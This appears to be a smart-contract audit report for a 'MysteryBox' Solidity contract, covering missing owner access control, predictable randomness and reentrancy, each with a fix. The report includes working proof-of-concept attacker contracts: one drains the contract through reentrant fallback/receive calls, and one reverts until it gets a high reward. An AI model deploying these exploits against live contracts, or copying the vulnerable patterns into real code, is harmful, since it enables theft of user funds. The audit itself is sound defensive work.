### H-3 Lack of access control on `MysteryBox::changeOwner` allows anyone to change the owner

**Description**
In `MysteryBox::changeOwner` function, there is no access control so anyone can change the owner.
**Impact**
Anyone can change the owner. Owner has ability to set the price of boxes, add new rewards, and withdraw funds. Anyone can be owner and withdraw funds.

**Recommended mitigation**

```diff

    function changeOwner(address _newOwner) public {
+        require(msg.sender == owner, "Only owner can change the owner");
        owner = _newOwner;
    }
```

### H-2 Week randomness in `MysteryBox::openBox` allows users to influence or predict rewards

**Description**
Hashing `msg.sender` and `block.timestamp` together creates a predictable value that can be used to determine the reward. Malicious user can use this predictable value to influence the rewards and get a higher reward than expected. Also a user can mine an address to get a higher reward than expected.
Additionally, a user can front-run the `MysteryBox::openBox` function and if the reward is not higher than expected user simply reverts the transaction.

**Impact**
User can get a higher reward than expected.

**Proof of Concepts**

1-Attacker sets up a contract with a attack funtion to buy a box and open it.
2-If the reward is not higher than expected, attacker can revert the transaction.

Additionally,
3-Validators can know ahead of time the `block.timestamp` and use that to predict when/how to open the box.

**Proof of Code**

<details>
<summary>Code</summary>

Place to following into `TestMysteryBox.t.sol`

```javascript
    function testGetHigherReward() public {
        MaliciousUser attackerContract = new MaliciousUser{value: 0.1 ether}(address(mysteryBox));
        address attackUser = makeAddr("attackUser");
        vm.deal(attackUser, 1 ether);

        vm.prank(attackUser);
        vm.expectRevert();
        attackerContract.buyBox();
    }
```

And this contact as well

```javascript
contract MaliciousUser {
    MysteryBox public mysteryBox;

    constructor(address _address) payable {
        mysteryBox = MysteryBox(_address);
    }

    function buyBox() public payable {
        mysteryBox.buyBox{value: 0.1 ether}();
        mysteryBox.openBox();
        MysteryBox.Reward[] memory rewards = mysteryBox.getRewards();

        if (rewards[0].value < 0.5 ether) {
            revert();
        }
    }
}
```

</details>

**Recommended mitigation**

Consider using crytographically secure random number generation such as Chainlink VRF.

### H-1 Reentrancy attack in `MysteryBox::claimAllRewards` and `MysteryBox::claimSingleReward` allows entrant to drain conract balance

**Description**
The `MysteryBox::claimAllRewards` and `MysteryBox::claimSingleReward` functions doesnt follow the CEI (checks-effects-interactions pattern) and as a result, enables anyone who has claimable rewards to drain the contract balance.
In the `MysteryBox::claimAllRewards` and `MysteryBox::claimSingleReward` functions, we first make an external call to the `msg.sender` to transfer the rewards. only after we delete from `MysteryBox::rewardsOwned` array.

```javascript
    function claimAllRewards() public {
        uint256 totalValue = 0;
        for (uint256 i = 0; i < rewardsOwned[msg.sender].length; i++) {
            totalValue += rewardsOwned[msg.sender][i].value;
        }
        require(totalValue > 0, "No rewards to claim");

@>      (bool success,) = payable(msg.sender).call{value: totalValue}("");
        require(success, "Transfer failed");

@>      delete rewardsOwned[msg.sender];
    }
```

```javascript
    function claimSingleReward(uint256 _index) public {
        require(_index <= rewardsOwned[msg.sender].length, "Invalid index");
        uint256 value = rewardsOwned[msg.sender][_index].value;
        require(value > 0, "No reward to claim");
@>      (bool success,) = payable(msg.sender).call{value: value}("");
        require(success, "Transfer failed");

@>      delete rewardsOwned[msg.sender][_index];
    }
```

A user who has claimable rewards could have a `fallback/receive` function that calls the
`MysteryBox::claimAllRewards` or `MysteryBox::claimSingleReward` function again and call same function again. They would continue to the cyle till drain the contract balance.

**Impact**
All contract balance could be stolen by the malicious user.

**Proof of Concepts**
1-Attacker sets up a contract with a `fallback/receive` function that calls the `MysteryBox::claimAllRewards` or `MysteryBox::claimSingleReward` function.
2-Attacker buy a box and open it.
3-Attacker calls the `MysteryBox::claimAllRewards` or `MysteryBox::claimSingleReward` function from their attacker contract draining the contract balance.

**Proof of Code**

<details>
<summary>Code</summary>

Place to following into `TestMysteryBox.t.sol`

```javascript
  function testReentrance() public {
        ReenrancyAttacker attackerContract = new ReenrancyAttacker{value: 0.1 ether}(address(mysteryBox));
        address attackUser = makeAddr("attackUser");
        vm.deal(attackUser, 1 ether);

        uint256 startingAttarckerBalance = address(attackerContract).balance;
        uint256 startingContractBalance = address(mysteryBox).balance;

        vm.prank(attackUser);

        vm.warp(9001); // on 9001 block timestamp with attacker contract gets a claimable reward
        attackerContract.buyBox();
        attackerContract.attack();

        console2.log("Starting Attacker Balance:", startingAttarckerBalance);
        console2.log("Starting Contract Balance:", startingContractBalance);

        console2.log("ending Attacker Balance:", address(attackerContract).balance);
        console2.log("ending Contract Balance:", address(mysteryBox).balance);
    }
```

And this contact as well

```javascript
contract ReenrancyAttacker {
    MysteryBox public mysteryBox;

    constructor(address _address) payable {
        mysteryBox = MysteryBox(_address);
    }

    function buyBox() public payable {
        mysteryBox.buyBox{value: 0.1 ether}();
        mysteryBox.openBox();
    }

    function attack() public {
        mysteryBox.claimAllRewards();
    }

    fallback() external payable {
        if (address(mysteryBox).balance > 0) {
            attack();
        }
    }

    receive() external payable {
        if (address(mysteryBox).balance > 0) {
            attack();
        }
    }
}
```

</details>

**Recommended mitigation**

To prevent this, we should have the `MysteryBox::claimAllRewards` function update the `MysteryBox::rewardsOwned` array before the external call.

```diff
    function claimAllRewards() public {
        uint256 totalValue = 0;
        for (uint256 i = 0; i < rewardsOwned[msg.sender].length; i++) {
            totalValue += rewardsOwned[msg.sender][i].value;
        }
        require(totalValue > 0, "No rewards to claim");


+        delete rewardsOwned[msg.sender];

        (bool success,) = payable(msg.sender).call{value: totalValue}("");
        require(success, "Transfer failed");

-        delete rewardsOwned[msg.sender];
    }
```

```diff
    function claimSingleReward(uint256 _index) public {
        require(_index <= rewardsOwned[msg.sender].length, "Invalid index");
        uint256 value = rewardsOwned[msg.sender][_index].value;
        require(value > 0, "No reward to claim");
+       delete rewardsOwned[msg.sender][_index];
        (bool success,) = payable(msg.sender).call{value: value}("");
        require(success, "Transfer failed");

-       delete rewardsOwned[msg.sender][_index];
    }
```
